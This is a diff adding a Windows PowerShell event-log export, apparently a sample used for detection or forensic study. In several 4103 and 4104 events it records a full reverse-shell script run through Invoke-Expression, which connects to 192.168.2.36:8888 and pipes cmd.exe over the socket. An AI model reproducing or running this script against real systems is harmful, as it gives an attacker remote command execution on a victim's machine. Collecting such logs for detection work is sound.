@@ -1,0 +1,664 @@
+﻿<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<Events><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{a0c1853b-5c40-4b15-8766-3cf1c58f985a}'/><EventID>4103</EventID><Version>1</Version><Level>4</Level><Task>106</Task><Opcode>20</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2020-11-26T23:09:08.017245900Z'/><EventRecordID>3923370</EventRecordID><Correlation ActivityID='{a033c5e5-c482-0000-748b-34a082c4d601}'/><Execution ProcessID='5084' ThreadID='3064'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>WIN-H8C7LGTI40B</Computer><Security UserID='S-1-5-21-3092757730-2535432651-4254931961-1000'/></System><EventData><Data Name='ContextInfo'>        Severity = Informational
+        Host Name = ConsoleHost
+        Host Version = 5.1.17763.1432
+        Host ID = 56695e71-df63-447f-8311-c57947e5ea89
+        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        Engine Version = 5.1.17763.1432
+        Runspace ID = 41a3aa59-a70f-4693-a2e2-e6bda4d0e16a
+        Pipeline ID = 9
+        Command Name = 
+        Command Type = Script
+        Script Name = 
+        Command Path = 
+        Sequence Number = 79
+        User = WIN-H8C7LGTI40B\NormalUser
+        Connected User = 
+        Shell ID = Microsoft.PowerShell
+</Data><Data Name='UserData'></Data><Data Name='Payload'>CommandInvocation(Out-Default): "Out-Default"
+ParameterBinding(Out-Default): name="InputObject"; value="True"
+</Data></EventData><RenderingInfo Culture='en-US'><Message>CommandInvocation(Out-Default): "Out-Default"
+ParameterBinding(Out-Default): name="InputObject"; value="True"
+
+
+Context:
+        Severity = Informational
+        Host Name = ConsoleHost
+        Host Version = 5.1.17763.1432
+        Host ID = 56695e71-df63-447f-8311-c57947e5ea89
+        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        Engine Version = 5.1.17763.1432
+        Runspace ID = 41a3aa59-a70f-4693-a2e2-e6bda4d0e16a
+        Pipeline ID = 9
+        Command Name = 
+        Command Type = Script
+        Script Name = 
+        Command Path = 
+        Sequence Number = 79
+        User = WIN-H8C7LGTI40B\NormalUser
+        Connected User = 
+        Shell ID = Microsoft.PowerShell
+
+
+User Data:
+
+</Message><Level>Information</Level><Task>Executing Pipeline</Task><Opcode>To be used when operation is just executing a method</Opcode><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{a0c1853b-5c40-4b15-8766-3cf1c58f985a}'/><EventID>4106</EventID><Version>1</Version><Level>5</Level><Task>103</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2020-11-26T23:09:08.016817700Z'/><EventRecordID>3923369</EventRecordID><Correlation ActivityID='{a033c5e5-c482-0000-748b-34a082c4d601}'/><Execution ProcessID='5084' ThreadID='3064'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>WIN-H8C7LGTI40B</Computer><Security UserID='S-1-5-21-3092757730-2535432651-4254931961-1000'/></System><EventData><Data Name='ScriptBlockId'>68507bd3-eba8-413a-9574-572f3b4f1cfa</Data><Data Name='RunspaceId'>41a3aa59-a70f-4693-a2e2-e6bda4d0e16a</Data></EventData><RenderingInfo Culture='en-US'><Message>Completed invocation of ScriptBlock ID: 68507bd3-eba8-413a-9574-572f3b4f1cfa
+Runspace ID: 41a3aa59-a70f-4693-a2e2-e6bda4d0e16a</Message><Level>Verbose</Level><Task>Stopping Command</Task><Opcode>On create calls</Opcode><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{a0c1853b-5c40-4b15-8766-3cf1c58f985a}'/><EventID>4103</EventID><Version>1</Version><Level>4</Level><Task>106</Task><Opcode>20</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2020-11-26T23:09:08.015254000Z'/><EventRecordID>3923368</EventRecordID><Correlation ActivityID='{a033c5e5-c482-0000-748b-34a082c4d601}'/><Execution ProcessID='5084' ThreadID='3064'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>WIN-H8C7LGTI40B</Computer><Security UserID='S-1-5-21-3092757730-2535432651-4254931961-1000'/></System><EventData><Data Name='ContextInfo'>        Severity = Informational
+        Host Name = ConsoleHost
+        Host Version = 5.1.17763.1432
+        Host ID = 56695e71-df63-447f-8311-c57947e5ea89
+        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        Engine Version = 5.1.17763.1432
+        Runspace ID = 41a3aa59-a70f-4693-a2e2-e6bda4d0e16a
+        Pipeline ID = 9
+        Command Name = Invoke-Expression
+        Command Type = Cmdlet
+        Script Name = 
+        Command Path = 
+        Sequence Number = 77
+        User = WIN-H8C7LGTI40B\NormalUser
+        Connected User = 
+        Shell ID = Microsoft.PowerShell
+</Data><Data Name='UserData'></Data><Data Name='Payload'>CommandInvocation(Invoke-Expression): "Invoke-Expression"
+ParameterBinding(Invoke-Expression): name="Command"; value="function cleanup {
+if ($client.Connected -eq $true) {$client.Close()}
+if ($process.ExitCode -ne $null) {$process.Close()}
+exit}
+$address = '192.168.2.36'
+$port = '8888'
+$client = New-Object system.net.sockets.tcpclient
+$client.connect($address,$port)
+$stream = $client.GetStream()
+$networkbuffer = New-Object System.Byte[] $client.ReceiveBufferSize
+$process = New-Object System.Diagnostics.Process
+$process.StartInfo.FileName = 'C:\\windows\\system32\\cmd.exe'
+$process.StartInfo.RedirectStandardInput = 1
+$process.StartInfo.RedirectStandardOutput = 1
+$process.StartInfo.UseShellExecute = 0
+$process.Start()
+$inputstream = $process.StandardInput
+$outputstream = $process.StandardOutput
+Start-Sleep 1
+$encoding = new-object System.Text.AsciiEncoding
+while($outputstream.Peek() -ne -1){$out += $encoding.GetString($outputstream.Read())}
+$stream.Write($encoding.GetBytes($out),0,$out.Length)
+$out = $null; $done = $false; $testing = 0;
+while (-not $done) {
+if ($client.Connected -ne $true) {cleanup}
+$pos = 0; $i = 1
+while (($i -gt 0) -and ($pos -lt $networkbuffer.Length)) {
+$read = $stream.Read($networkbuffer,$pos,$networkbuffer.Length - $pos)
+$pos+=$read; if ($pos -and ($networkbuffer[0..$($pos-1)] -contains 10)) {break}}
+if ($pos -gt 0) {
+$string = $encoding.GetString($networkbuffer,0,$pos)
+$inputstream.write($string)
+start-sleep 1
+if ($process.ExitCode -ne $null) {cleanup}
+else {
+$out = $encoding.GetString($outputstream.Read())
+while($outputstream.Peek() -ne -1){
+$out += $encoding.GetString($outputstream.Read()); if ($out -eq $string) {$out = ''}}
+$stream.Write($encoding.GetBytes($out),0,$out.length)
+$out = $null
+$string = $null}} else {cleanup}}
+"
+TerminatingError(): "System error."
+</Data></EventData><RenderingInfo Culture='en-US'><Message>CommandInvocation(Invoke-Expression): "Invoke-Expression"
+ParameterBinding(Invoke-Expression): name="Command"; value="function cleanup {
+if ($client.Connected -eq $true) {$client.Close()}
+if ($process.ExitCode -ne $null) {$process.Close()}
+exit}
+$address = '192.168.2.36'
+$port = '8888'
+$client = New-Object system.net.sockets.tcpclient
+$client.connect($address,$port)
+$stream = $client.GetStream()
+$networkbuffer = New-Object System.Byte[] $client.ReceiveBufferSize
+$process = New-Object System.Diagnostics.Process
+$process.StartInfo.FileName = 'C:\\windows\\system32\\cmd.exe'
+$process.StartInfo.RedirectStandardInput = 1
+$process.StartInfo.RedirectStandardOutput = 1
+$process.StartInfo.UseShellExecute = 0
+$process.Start()
+$inputstream = $process.StandardInput
+$outputstream = $process.StandardOutput
+Start-Sleep 1
+$encoding = new-object System.Text.AsciiEncoding
+while($outputstream.Peek() -ne -1){$out += $encoding.GetString($outputstream.Read())}
+$stream.Write($encoding.GetBytes($out),0,$out.Length)
+$out = $null; $done = $false; $testing = 0;
+while (-not $done) {
+if ($client.Connected -ne $true) {cleanup}
+$pos = 0; $i = 1
+while (($i -gt 0) -and ($pos -lt $networkbuffer.Length)) {
+$read = $stream.Read($networkbuffer,$pos,$networkbuffer.Length - $pos)
+$pos+=$read; if ($pos -and ($networkbuffer[0..$($pos-1)] -contains 10)) {break}}
+if ($pos -gt 0) {
+$string = $encoding.GetString($networkbuffer,0,$pos)
+$inputstream.write($string)
+start-sleep 1
+if ($process.ExitCode -ne $null) {cleanup}
+else {
+$out = $encoding.GetString($outputstream.Read())
+while($outputstream.Peek() -ne -1){
+$out += $encoding.GetString($outputstream.Read()); if ($out -eq $string) {$out = ''}}
+$stream.Write($encoding.GetBytes($out),0,$out.length)
+$out = $null
+$string = $null}} else {cleanup}}
+"
+TerminatingError(): "System error."
+
+
+Context:
+        Severity = Informational
+        Host Name = ConsoleHost
+        Host Version = 5.1.17763.1432
+        Host ID = 56695e71-df63-447f-8311-c57947e5ea89
+        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        Engine Version = 5.1.17763.1432
+        Runspace ID = 41a3aa59-a70f-4693-a2e2-e6bda4d0e16a
+        Pipeline ID = 9
+        Command Name = Invoke-Expression
+        Command Type = Cmdlet
+        Script Name = 
+        Command Path = 
+        Sequence Number = 77
+        User = WIN-H8C7LGTI40B\NormalUser
+        Connected User = 
+        Shell ID = Microsoft.PowerShell
+
+
+User Data:
+
+</Message><Level>Information</Level><Task>Executing Pipeline</Task><Opcode>To be used when operation is just executing a method</Opcode><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{a0c1853b-5c40-4b15-8766-3cf1c58f985a}'/><EventID>4100</EventID><Version>1</Version><Level>3</Level><Task>106</Task><Opcode>19</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2020-11-26T23:09:08.013775000Z'/><EventRecordID>3923367</EventRecordID><Correlation ActivityID='{a033c5e5-c482-0000-748b-34a082c4d601}'/><Execution ProcessID='5084' ThreadID='3064'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>WIN-H8C7LGTI40B</Computer><Security UserID='S-1-5-21-3092757730-2535432651-4254931961-1000'/></System><EventData><Data Name='ContextInfo'>        Severity = Warning
+        Host Name = ConsoleHost
+        Host Version = 5.1.17763.1432
+        Host ID = 56695e71-df63-447f-8311-c57947e5ea89
+        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        Engine Version = 5.1.17763.1432
+        Runspace ID = 41a3aa59-a70f-4693-a2e2-e6bda4d0e16a
+        Pipeline ID = 9
+        Command Name = 
+        Command Type = 
+        Script Name = 
+        Command Path = 
+        Sequence Number = 75
+        User = WIN-H8C7LGTI40B\NormalUser
+        Connected User = 
+        Shell ID = Microsoft.PowerShell
+</Data><Data Name='UserData'></Data><Data Name='Payload'>Error Message = System error.
+</Data></EventData><RenderingInfo Culture='en-US'><Message>Error Message = System error.
+
+
+Context:
+        Severity = Warning
+        Host Name = ConsoleHost
+        Host Version = 5.1.17763.1432
+        Host ID = 56695e71-df63-447f-8311-c57947e5ea89
+        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        Engine Version = 5.1.17763.1432
+        Runspace ID = 41a3aa59-a70f-4693-a2e2-e6bda4d0e16a
+        Pipeline ID = 9
+        Command Name = 
+        Command Type = 
+        Script Name = 
+        Command Path = 
+        Sequence Number = 75
+        User = WIN-H8C7LGTI40B\NormalUser
+        Connected User = 
+        Shell ID = Microsoft.PowerShell
+
+
+User Data:
+
+</Message><Level>Warning</Level><Task>Executing Pipeline</Task><Opcode>To be used when an exception is raised</Opcode><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{a0c1853b-5c40-4b15-8766-3cf1c58f985a}'/><EventID>4106</EventID><Version>1</Version><Level>5</Level><Task>103</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2020-11-26T23:09:08.013537400Z'/><EventRecordID>3923366</EventRecordID><Correlation ActivityID='{a033c5e5-c482-0000-748b-34a082c4d601}'/><Execution ProcessID='5084' ThreadID='3064'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>WIN-H8C7LGTI40B</Computer><Security UserID='S-1-5-21-3092757730-2535432651-4254931961-1000'/></System><EventData><Data Name='ScriptBlockId'>f255291b-96d8-489d-a112-5c58faedb11c</Data><Data Name='RunspaceId'>41a3aa59-a70f-4693-a2e2-e6bda4d0e16a</Data></EventData><RenderingInfo Culture='en-US'><Message>Completed invocation of ScriptBlock ID: f255291b-96d8-489d-a112-5c58faedb11c
+Runspace ID: 41a3aa59-a70f-4693-a2e2-e6bda4d0e16a</Message><Level>Verbose</Level><Task>Stopping Command</Task><Opcode>On create calls</Opcode><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{a0c1853b-5c40-4b15-8766-3cf1c58f985a}'/><EventID>4106</EventID><Version>1</Version><Level>5</Level><Task>103</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2020-11-26T23:09:08.012524000Z'/><EventRecordID>3923365</EventRecordID><Correlation ActivityID='{a033c5e5-c482-0000-748b-34a082c4d601}'/><Execution ProcessID='5084' ThreadID='3064'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>WIN-H8C7LGTI40B</Computer><Security UserID='S-1-5-21-3092757730-2535432651-4254931961-1000'/></System><EventData><Data Name='ScriptBlockId'>e449475a-a596-47e8-be68-f9413701d383</Data><Data Name='RunspaceId'>41a3aa59-a70f-4693-a2e2-e6bda4d0e16a</Data></EventData><RenderingInfo Culture='en-US'><Message>Completed invocation of ScriptBlock ID: e449475a-a596-47e8-be68-f9413701d383
+Runspace ID: 41a3aa59-a70f-4693-a2e2-e6bda4d0e16a</Message><Level>Verbose</Level><Task>Stopping Command</Task><Opcode>On create calls</Opcode><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{a0c1853b-5c40-4b15-8766-3cf1c58f985a}'/><EventID>4105</EventID><Version>1</Version><Level>5</Level><Task>102</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2020-11-26T23:09:07.982898800Z'/><EventRecordID>3923364</EventRecordID><Correlation ActivityID='{a033c5e5-c482-0000-748b-34a082c4d601}'/><Execution ProcessID='5084' ThreadID='3064'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>WIN-H8C7LGTI40B</Computer><Security UserID='S-1-5-21-3092757730-2535432651-4254931961-1000'/></System><EventData><Data Name='ScriptBlockId'>e449475a-a596-47e8-be68-f9413701d383</Data><Data Name='RunspaceId'>41a3aa59-a70f-4693-a2e2-e6bda4d0e16a</Data></EventData><RenderingInfo Culture='en-US'><Message>Started invocation of ScriptBlock ID: e449475a-a596-47e8-be68-f9413701d383
+Runspace ID: 41a3aa59-a70f-4693-a2e2-e6bda4d0e16a</Message><Level>Verbose</Level><Task>Starting Command</Task><Opcode>On create calls</Opcode><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{a0c1853b-5c40-4b15-8766-3cf1c58f985a}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2020-11-26T23:09:07.982588900Z'/><EventRecordID>3923363</EventRecordID><Correlation ActivityID='{a033c5e5-c482-0000-748b-34a082c4d601}'/><Execution ProcessID='5084' ThreadID='3064'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>WIN-H8C7LGTI40B</Computer><Security UserID='S-1-5-21-3092757730-2535432651-4254931961-1000'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>function cleanup {
+if ($client.Connected -eq $true) {$client.Close()}
+if ($process.ExitCode -ne $null) {$process.Close()}
+exit}</Data><Data Name='ScriptBlockId'>e449475a-a596-47e8-be68-f9413701d383</Data><Data Name='Path'></Data></EventData><RenderingInfo Culture='en-US'><Message>Creating Scriptblock text (1 of 1):
+function cleanup {
+if ($client.Connected -eq $true) {$client.Close()}
+if ($process.ExitCode -ne $null) {$process.Close()}
+exit}
+
+ScriptBlock ID: e449475a-a596-47e8-be68-f9413701d383
+Path: </Message><Level>Verbose</Level><Task>Execute a Remote Command</Task><Opcode>On create calls</Opcode><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{a0c1853b-5c40-4b15-8766-3cf1c58f985a}'/><EventID>4103</EventID><Version>1</Version><Level>4</Level><Task>106</Task><Opcode>20</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2020-11-26T23:09:07.969993300Z'/><EventRecordID>3923362</EventRecordID><Correlation ActivityID='{a033c5e5-c482-0000-728b-34a082c4d601}'/><Execution ProcessID='5084' ThreadID='3064'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>WIN-H8C7LGTI40B</Computer><Security UserID='S-1-5-21-3092757730-2535432651-4254931961-1000'/></System><EventData><Data Name='ContextInfo'>        Severity = Informational
+        Host Name = ConsoleHost
+        Host Version = 5.1.17763.1432
+        Host ID = 56695e71-df63-447f-8311-c57947e5ea89
+        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        Engine Version = 5.1.17763.1432
+        Runspace ID = 41a3aa59-a70f-4693-a2e2-e6bda4d0e16a
+        Pipeline ID = 9
+        Command Name = Start-Sleep
+        Command Type = Cmdlet
+        Script Name = 
+        Command Path = 
+        Sequence Number = 74
+        User = WIN-H8C7LGTI40B\NormalUser
+        Connected User = 
+        Shell ID = Microsoft.PowerShell
+</Data><Data Name='UserData'></Data><Data Name='Payload'>CommandInvocation(Start-Sleep): "Start-Sleep"
+ParameterBinding(Start-Sleep): name="Seconds"; value="1"
+</Data></EventData><RenderingInfo Culture='en-US'><Message>CommandInvocation(Start-Sleep): "Start-Sleep"
+ParameterBinding(Start-Sleep): name="Seconds"; value="1"
+
+
+Context:
+        Severity = Informational
+        Host Name = ConsoleHost
+        Host Version = 5.1.17763.1432
+        Host ID = 56695e71-df63-447f-8311-c57947e5ea89
+        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        Engine Version = 5.1.17763.1432
+        Runspace ID = 41a3aa59-a70f-4693-a2e2-e6bda4d0e16a
+        Pipeline ID = 9
+        Command Name = Start-Sleep
+        Command Type = Cmdlet
+        Script Name = 
+        Command Path = 
+        Sequence Number = 74
+        User = WIN-H8C7LGTI40B\NormalUser
+        Connected User = 
+        Shell ID = Microsoft.PowerShell
+
+
+User Data:
+
+</Message><Level>Information</Level><Task>Executing Pipeline</Task><Opcode>To be used when operation is just executing a method</Opcode><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{a0c1853b-5c40-4b15-8766-3cf1c58f985a}'/><EventID>4103</EventID><Version>1</Version><Level>4</Level><Task>106</Task><Opcode>20</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2020-11-26T23:08:59.154276100Z'/><EventRecordID>3923361</EventRecordID><Correlation ActivityID='{a033c5e5-c482-0001-629e-34a082c4d601}'/><Execution ProcessID='5084' ThreadID='3064'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>WIN-H8C7LGTI40B</Computer><Security UserID='S-1-5-21-3092757730-2535432651-4254931961-1000'/></System><EventData><Data Name='ContextInfo'>        Severity = Informational
+        Host Name = ConsoleHost
+        Host Version = 5.1.17763.1432
+        Host ID = 56695e71-df63-447f-8311-c57947e5ea89
+        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        Engine Version = 5.1.17763.1432
+        Runspace ID = 41a3aa59-a70f-4693-a2e2-e6bda4d0e16a
+        Pipeline ID = 9
+        Command Name = New-Object
+        Command Type = Cmdlet
+        Script Name = 
+        Command Path = 
+        Sequence Number = 72
+        User = WIN-H8C7LGTI40B\NormalUser
+        Connected User = 
+        Shell ID = Microsoft.PowerShell
+</Data><Data Name='UserData'></Data><Data Name='Payload'>CommandInvocation(New-Object): "New-Object"
+ParameterBinding(New-Object): name="TypeName"; value="System.Text.AsciiEncoding"
+</Data></EventData><RenderingInfo Culture='en-US'><Message>CommandInvocation(New-Object): "New-Object"
+ParameterBinding(New-Object): name="TypeName"; value="System.Text.AsciiEncoding"
+
+
+Context:
+        Severity = Informational
+        Host Name = ConsoleHost
+        Host Version = 5.1.17763.1432
+        Host ID = 56695e71-df63-447f-8311-c57947e5ea89
+        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        Engine Version = 5.1.17763.1432
+        Runspace ID = 41a3aa59-a70f-4693-a2e2-e6bda4d0e16a
+        Pipeline ID = 9
+        Command Name = New-Object
+        Command Type = Cmdlet
+        Script Name = 
+        Command Path = 
+        Sequence Number = 72
+        User = WIN-H8C7LGTI40B\NormalUser
+        Connected User = 
+        Shell ID = Microsoft.PowerShell
+
+
+User Data:
+
+</Message><Level>Information</Level><Task>Executing Pipeline</Task><Opcode>To be used when operation is just executing a method</Opcode><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{a0c1853b-5c40-4b15-8766-3cf1c58f985a}'/><EventID>4103</EventID><Version>1</Version><Level>4</Level><Task>106</Task><Opcode>20</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2020-11-26T23:08:59.152809700Z'/><EventRecordID>3923360</EventRecordID><Correlation ActivityID='{a033c5e5-c482-0000-6b8b-34a082c4d601}'/><Execution ProcessID='5084' ThreadID='3064'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>WIN-H8C7LGTI40B</Computer><Security UserID='S-1-5-21-3092757730-2535432651-4254931961-1000'/></System><EventData><Data Name='ContextInfo'>        Severity = Informational
+        Host Name = ConsoleHost
+        Host Version = 5.1.17763.1432
+        Host ID = 56695e71-df63-447f-8311-c57947e5ea89
+        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        Engine Version = 5.1.17763.1432
+        Runspace ID = 41a3aa59-a70f-4693-a2e2-e6bda4d0e16a
+        Pipeline ID = 9
+        Command Name = Start-Sleep
+        Command Type = Cmdlet
+        Script Name = 
+        Command Path = 
+        Sequence Number = 70
+        User = WIN-H8C7LGTI40B\NormalUser
+        Connected User = 
+        Shell ID = Microsoft.PowerShell
+</Data><Data Name='UserData'></Data><Data Name='Payload'>CommandInvocation(Start-Sleep): "Start-Sleep"
+ParameterBinding(Start-Sleep): name="Seconds"; value="1"
+</Data></EventData><RenderingInfo Culture='en-US'><Message>CommandInvocation(Start-Sleep): "Start-Sleep"
+ParameterBinding(Start-Sleep): name="Seconds"; value="1"
+
+
+Context:
+        Severity = Informational
+        Host Name = ConsoleHost
+        Host Version = 5.1.17763.1432
+        Host ID = 56695e71-df63-447f-8311-c57947e5ea89
+        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        Engine Version = 5.1.17763.1432
+        Runspace ID = 41a3aa59-a70f-4693-a2e2-e6bda4d0e16a
+        Pipeline ID = 9
+        Command Name = Start-Sleep
+        Command Type = Cmdlet
+        Script Name = 
+        Command Path = 
+        Sequence Number = 70
+        User = WIN-H8C7LGTI40B\NormalUser
+        Connected User = 
+        Shell ID = Microsoft.PowerShell
+
+
+User Data:
+
+</Message><Level>Information</Level><Task>Executing Pipeline</Task><Opcode>To be used when operation is just executing a method</Opcode><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{a0c1853b-5c40-4b15-8766-3cf1c58f985a}'/><EventID>4103</EventID><Version>1</Version><Level>4</Level><Task>106</Task><Opcode>20</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2020-11-26T23:08:57.975958800Z'/><EventRecordID>3923359</EventRecordID><Correlation ActivityID='{a033c5e5-c482-0000-678b-34a082c4d601}'/><Execution ProcessID='5084' ThreadID='3064'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>WIN-H8C7LGTI40B</Computer><Security UserID='S-1-5-21-3092757730-2535432651-4254931961-1000'/></System><EventData><Data Name='ContextInfo'>        Severity = Informational
+        Host Name = ConsoleHost
+        Host Version = 5.1.17763.1432
+        Host ID = 56695e71-df63-447f-8311-c57947e5ea89
+        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        Engine Version = 5.1.17763.1432
+        Runspace ID = 41a3aa59-a70f-4693-a2e2-e6bda4d0e16a
+        Pipeline ID = 9
+        Command Name = New-Object
+        Command Type = Cmdlet
+        Script Name = 
+        Command Path = 
+        Sequence Number = 68
+        User = WIN-H8C7LGTI40B\NormalUser
+        Connected User = 
+        Shell ID = Microsoft.PowerShell
+</Data><Data Name='UserData'></Data><Data Name='Payload'>CommandInvocation(New-Object): "New-Object"
+ParameterBinding(New-Object): name="TypeName"; value="System.Diagnostics.Process"
+</Data></EventData><RenderingInfo Culture='en-US'><Message>CommandInvocation(New-Object): "New-Object"
+ParameterBinding(New-Object): name="TypeName"; value="System.Diagnostics.Process"
+
+
+Context:
+        Severity = Informational
+        Host Name = ConsoleHost
+        Host Version = 5.1.17763.1432
+        Host ID = 56695e71-df63-447f-8311-c57947e5ea89
+        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        Engine Version = 5.1.17763.1432
+        Runspace ID = 41a3aa59-a70f-4693-a2e2-e6bda4d0e16a
+        Pipeline ID = 9
+        Command Name = New-Object
+        Command Type = Cmdlet
+        Script Name = 
+        Command Path = 
+        Sequence Number = 68
+        User = WIN-H8C7LGTI40B\NormalUser
+        Connected User = 
+        Shell ID = Microsoft.PowerShell
+
+
+User Data:
+
+</Message><Level>Information</Level><Task>Executing Pipeline</Task><Opcode>To be used when operation is just executing a method</Opcode><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event><Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{a0c1853b-5c40-4b15-8766-3cf1c58f985a}'/><EventID>4103</EventID><Version>1</Version><Level>4</Level><Task>106</Task><Opcode>20</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2020-11-26T23:08:57.974713000Z'/><EventRecordID>3923358</EventRecordID><Correlation ActivityID='{a033c5e5-c482-0000-668b-34a082c4d601}'/><Execution ProcessID='5084' ThreadID='3064'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>WIN-H8C7LGTI40B</Computer><Security UserID='S-1-5-21-3092757730-2535432651-4254931961-1000'/></System><EventData><Data Name='ContextInfo'>        Severity = Informational
+        Host Name = ConsoleHost
+        Host Version = 5.1.17763.1432
+        Host ID = 56695e71-df63-447f-8311-c57947e5ea89
+        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        Engine Version = 5.1.17763.1432
+        Runspace ID = 41a3aa59-a70f-4693-a2e2-e6bda4d0e16a
+        Pipeline ID = 9
+        Command Name = New-Object
+        Command Type = Cmdlet
+        Script Name = 
+        Command Path = 
+        Sequence Number = 66
+        User = WIN-H8C7LGTI40B\NormalUser
+        Connected User = 
+        Shell ID = Microsoft.PowerShell
+</Data><Data Name='UserData'></Data><Data Name='Payload'>CommandInvocation(New-Object): "New-Object"
+ParameterBinding(New-Object): name="TypeName"; value="System.Byte[]"
+ParameterBinding(New-Object): name="ArgumentList"; value="131072"
+</Data></EventData><RenderingInfo Culture='en-US'><Message>CommandInvocation(New-Object): "New-Object"
+ParameterBinding(New-Object): name="TypeName"; value="System.Byte[]"
+ParameterBinding(New-Object): name="ArgumentList"; value="131072"
+
+
+Context:
+        Severity = Informational
+        Host Name = ConsoleHost
+        Host Version = 5.1.17763.1432
+        Host ID = 56695e71-df63-447f-8311-c57947e5ea89
+        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        Engine Version = 5.1.17763.1432
+        Runspace ID = 41a3aa59-a70f-4693-a2e2-e6bda4d0e16a
+        Pipeline ID = 9
+        Command Name = New-Object
+        Command Type = Cmdlet
+        Script Name = 
+        Command Path = 
+        Sequence Number = 66
+        User = WIN-H8C7LGTI40B\NormalUser
+        Connected User = 
